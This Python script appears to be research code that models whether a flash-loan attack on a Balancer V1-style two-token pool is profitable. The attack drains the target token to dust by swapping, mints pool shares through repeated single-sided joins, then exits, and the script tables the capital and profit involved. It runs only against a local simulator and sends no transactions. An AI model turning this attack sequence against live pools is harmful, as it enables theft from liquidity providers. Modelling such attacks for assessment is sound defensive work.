"""
Is the FLASH-LOAN variant (compress -> dilute -> exit) viable at all in V1?

For a *balanced* 2-token pool we run the whole attack with exact arithmetic and
track the two token flows.  Net P&L = (received - paid) per token, valued at
market.  Peak working capital = max(input spent during compression, target
deposited during dilution) -- both legs are borrowed and repaid inside the tx.

Aave V3 flash fee = 0.05% of the borrowed notional is subtracted.
"""
from bmath_sim import *

FLASH_FEE = 0.0005
TVL = 1_000_000.0
fee = 3 * 10**14


def attack(w, dec_t, dec_o, px_t, px_o, target_dust, supply_growth=1e4):
    """balanced pool, target weight w; dust the target down to `target_dust` raw units"""
    v_t, v_o = TVL * w, TVL * (1 - w)
    bT = int(v_t / px_t * 10**dec_t)
    bO = int(v_o / px_o * 10**dec_o)
    p = Pool([{"sym": "T", "dec": dec_t, "bal": bT, "denorm": int(w * BONE)},
              {"sym": "O", "dec": dec_o, "bal": bO, "denorm": int((1 - w) * BONE)}],
             fee=fee)
    paid_O, got_T, n_sw = 0, 0, 0
    while p.t["T"]["bal"] > target_dust and n_sw < 600:
        aO = min(bmul(p.t["T"]["bal"], MAX_OUT_RATIO), p.t["T"]["bal"] - target_dust)
        if aO == 0:
            break
        try:
            aI = p.swapExactAmountOut("O", 2**255, "T", aO, 2**300)
        except Revert:
            break
        paid_O += aI
        got_T += aO
        n_sw += 1
    if p.t["T"]["bal"] > target_dust * 3:
        return None                                   # could not compress
    pS0 = p.pS
    dep_T = 0
    n_m = 0
    while p.pS < pS0 * supply_growth and n_m < 600:
        cap = bmul(p.t["T"]["bal"], MAX_IN_RATIO)
        aI = cap if cap >= 1 else 1
        try:
            p.joinswapExternAmountIn("T", aI, 0)
            dep_T += aI
        except Revert:
            try:
                p.joinswapExternAmountIn("T", 1, 0)
                dep_T += 1
            except Revert:
                break
        n_m += 1
    mine = p.pS - pS0
    if mine == 0:
        return None
    ratio = mine / p.pS
    got_O = p.t["O"]["bal"] * ratio
    got_T += p.t["T"]["bal"] * ratio
    pnl_O = got_O - paid_O
    pnl_T = got_T - dep_T
    pnl_usd = pnl_O * px_o / 10**dec_o + pnl_T * px_t / 10**dec_t
    cap_usd = max(paid_O * px_o / 10**dec_o, dep_T * px_t / 10**dec_t)
    return dict(swaps=n_sw, mints=n_m, cap=cap_usd, pnl=pnl_usd,
                net=pnl_usd - FLASH_FEE * cap_usd, share=ratio)


print(f"{'w':>5} {'dec':>4} {'dust':>12} {'comp':>7} {'mints':>6} "
      f"{'peak capital':>16} {'gross P&L':>13} {'after 0.05%':>14} {'viable?':>8}")
for w in (0.5, 0.6, 0.7, 0.8, 0.9):
    for dec_t in (18, 8):
        for dust in (4, 10**6, 10**10):
            r = attack(w, dec_t, 18, 1.0, 1.0, dust)
            if not r:
                continue
            print(f"{w:>5.1f} {dec_t:>4} {dust:>12,} {r['swaps']:>7} {r['mints']:>6} "
                  f"{'$'+format(r['cap'], ',.0f'):>16} {'$'+format(r['pnl'], ',.0f'):>13} "
                  f"{'$'+format(r['net'], ',.0f'):>14} "
                  f"{('YES' if r['net'] > 0 else 'no'):>8}")
print("\n('capital' = loan needed for BOTH legs; both are repaid inside the tx, so the")
print(" real cost is the 0.05% flash fee on that notional + the 0.03% pool fee)")
